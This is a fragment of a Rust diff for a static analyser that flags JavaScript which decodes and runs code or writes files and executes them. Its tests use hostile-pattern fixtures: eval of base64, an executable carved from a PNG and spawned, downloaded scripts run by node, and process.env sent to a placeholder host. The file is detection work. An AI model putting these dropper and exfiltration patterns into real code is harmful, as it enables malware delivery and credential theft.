+    let mut decoded: Vec<(usize, usize)> = Vec::new();
+    let dropped = first_drop(text, &findings);
     for f in findings {
         match f {
             Out::Send { at, kind, what, in_address: weak } => {
@@ -2041,9 +2728,12 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
                     first = Some((at, cat));
                 }
             }
+            Out::Decoded { at, from } => decoded.push((at as usize, from as usize)),
             _ => {}
         }
     }
+    decoded.sort_unstable();
+    decoded.dedup_by_key(|d| d.0);
     let sent = match best {
         Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
         None => Answer::Nothing,
@@ -2052,7 +2742,7 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
         let at = (at as usize).min(text.len());
         (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
     });
-    Some(Facts { sent, received })
+    Some(Facts { sent, received, decoded, dropped })
 }
 
 #[cfg(test)]
@@ -2365,5 +3055,91 @@ mod tests {
         // code in a string is not code
         let src = format!("const doc = `fetch('https://{}/x', {{body: JSON.stringify(process.env)}})`;\n", HOST);
         assert_eq!(sent(&src), None);
+    }
+
+    /// The lines of the code the text decodes and runs (each run's line,
+    /// the decoding's).
+    fn decoded(src: &str) -> Vec<(usize, usize)> {
+        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+        let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
+        match facts_here(&text) {
+            Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
+            None => panic!("not read: {}", src),
+        }
+    }
+
+    #[test]
+    fn code_it_decodes_and_runs() {
+        // atob, Buffer.from(…, 'base64'), a decryption: run as code
+        assert_eq!(decoded("eval(atob('Y29uc29sZS5sb2coMSk='));\n"), vec![(1, 1)]);
+        let src = "const s = Buffer.from(p, 'base64').toString();\nconst f = new Function(s);\nf();\n";
+        assert_eq!(decoded(src), vec![(2, 1)]);
+        let src = "const CryptoJS = require('crypto-js');\nconst c = CryptoJS.AES.decrypt(blob, key).toString(CryptoJS.enc.Utf8);\nrequire('vm').runInThisContext(c);\n";
+        assert_eq!(decoded(src), vec![(3, 2)]);
+        // through the script's own function
+        let src = "function unpack(x) { return atob(x); }\neval(unpack('Y29uc29sZS5sb2coMSk='));\n";
+        assert_eq!(decoded(src), vec![(2, 1)]);
+        // child_process imported dynamically; any object's execSync (a regular expression's exec is not)
+        let src = "const t = atob(p);\nconst cp = await import('child_process');\ncp.exec(t);\n";
+        assert_eq!(decoded(src), vec![(3, 1)]);
+        assert_eq!(decoded("const t = atob(p);\nanything.execSync(t);\n"), vec![(2, 1)]);
+        assert_eq!(decoded("const t = atob(p);\nconst m = /x/.exec(t);\nre.exec(t);\n"), vec![]);
+        // not run, encoded rather than decoded, or code in a string: nothing
+        assert_eq!(decoded("const s = atob(p);\nconsole.log(s);\n"), vec![]);
+        assert_eq!(decoded("const u = `data:text/javascript;base64,${Buffer.from(code).toString('base64')}`;\neval(code);\n"), vec![]);
+        let src = "var kWorkerCode = `\nself.onmessage = (e) => {\n  const script = atob(e.data.scriptContent);\n  new Function(script)();\n};\n`;\n";
+        assert_eq!(decoded(src), vec![]);
+        // a program it decodes, run; a fixed program given decoded data: nothing
+        let src = "const { spawnSync } = require('child_process');\nconst cmd = Buffer.from(b, 'base64').toString();\nspawnSync(cmd, ['-q']);\n";
+        assert_eq!(decoded(src), vec![(3, 2)]);
+        assert_eq!(decoded("const cp = require('child_process');\ncp.execFileSync('git', ['apply', atob(p)]);\n"), vec![]);
+        assert_eq!(decoded("const m = /x/.exec(atob(p));\n"), vec![]);
+        // es-module-lexer's shape: a WebAssembly module decoded from base64, whose exports' answers a
+        // string evaluator reads, runs no code it decodes
+        let src = "let Q;\nfunction N(C){try{return(0,eval)(C)}catch{}}\nfunction parse(s){const a=Q.sa(s.length);return N(s.slice(Q.ss(),Q.se()))}\nconst F=WebAssembly.compile(typeof Buffer<'u'?Buffer.from(L,'base64'):Uint8Array.from(atob(L),A=>A.charCodeAt(0))).then(WebAssembly.instantiate).then(({exports:A})=>{Q=A});\nvar L='AGFzbQ';\nexports.parse=parse;\n";
+        assert_eq!(decoded(src), vec![]);
+    }
+
+    fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
+        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+        match facts_here(&text) {
+            Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
+            None => panic!("not read: {}", src),
+        }
+    }
+
+    #[test]
+    fn files_it_writes_then_runs() {
+        // a program carved out of an image the package ships, written, made executable, run
+        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst img = fs.readFileSync(__dirname + '/logo.png');\nconst exe = img.subarray(4096);\nconst p = require('os').tmpdir() + '/helper';\nfs.writeFileSync(p, exe);\nfs.chmodSync(p, 0o755);\nspawn(p, [], { detached: true });\n";
+        assert_eq!(dropped(src).map(|d| (d.0, d.1, d.2)), Some((8, K_CARVED, "logo.png".to_string())));
+        // a decoded script, by a stream, run by node; a constant path in a command line
+        let src = "const fs = require('fs');\nconst ws = fs.createWriteStream('/tmp/x.js');\nws.write(Buffer.from(B, 'base64'));\nws.end();\nrequire('child_process').execSync('node /tmp/x.js');\n";
+        assert_eq!(dropped(src).map(|d| (d.0, d.1 & K_DECODED != 0, d.3)), Some((5, true, Some("node".into()))));
+        let src = "const fs = require('fs');\nconst cp = require('child_process');\nconst f = '/tmp/' + Date.now() + '.sh';\nfs.writeFileSync(f, atob(B));\ncp.exec('chmod +x ' + f + ' && ' + f);\n";
+        assert_eq!(dropped(src).map(|d| d.0), Some(5));
+        let src = "const fs = require('fs');\nconst { fork } = require('child_process');\nconst p = `${__dirname}/w.js`;\nfs.writeFileSync(p, require('zlib').inflateSync(blob));\nfork(p);\n";
+        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((5, Some("node".into()))));
+        // a download written, run by an interpreter; a binary downloaded and run (installers): nothing
+        // (what a callback is given is followed by the function's summary, which keeps no file: not yet)
+        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/i.js');\n  fs.writeFileSync('i.js', await res.text());\n  spawn(process.execPath, ['i.js']);\n}\ngo();\n";
+        assert_eq!(dropped(src).map(|d| (d.0, d.1, d.3)), Some((6, K_RECEIVED, Some("node".into()))));
+        let src = "const fs = require('fs');\nconst { execFileSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/bin');\n  fs.writeFileSync('bin/tool', Buffer.from(await res.arrayBuffer()));\n  execFileSync('bin/tool', ['--version']);\n}\ngo();\n";
+        assert_eq!(dropped(src), None);
+        // cmd runs a batch file as a script, anything else as a program
+        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/x');\n  fs.writeFileSync('run.cmd', await res.text());\n  execSync('cmd /c run.cmd');\n}\ngo();\n";
+        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((6, Some("cmd".into()))));
+        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/x');\n  fs.writeFileSync('setup.exe', Buffer.from(await res.arrayBuffer()));\n  execSync('cmd /c setup.exe /S');\n}\ngo();\n";
+        assert_eq!(dropped(src), None);
+        // a whole file copied and run, text written and run, another function's local: nothing
+        let src = "const fs = require('fs');\nconst { spawnSync } = require('child_process');\nfs.writeFileSync('/tmp/t', fs.readFileSync('pkg/t'));\nspawnSync('/tmp/t');\n";
+        assert_eq!(dropped(src), None);
+        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nfs.writeFileSync('/tmp/x.sh', 'echo hi');\nexecSync('sh /tmp/x.sh');\n";
+        assert_eq!(dropped(src), None);
+        let src = "const fs = require('fs');\nconst { spawnSync } = require('child_process');\nfunction save(d) { const p = 'out.bin'; fs.writeFileSync(p, atob(d)); }\nfunction run(p) { spawnSync(p, ['--help']); }\n";
+        assert_eq!(dropped(src), None);
+        // a text read sliced is not a binary's
+        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst s = fs.readFileSync('a.txt', 'utf8').slice(10);\nfs.writeFileSync('/tmp/a', s);\nspawn('/tmp/a');\n";
+        assert_eq!(dropped(src), None);
     }
 }
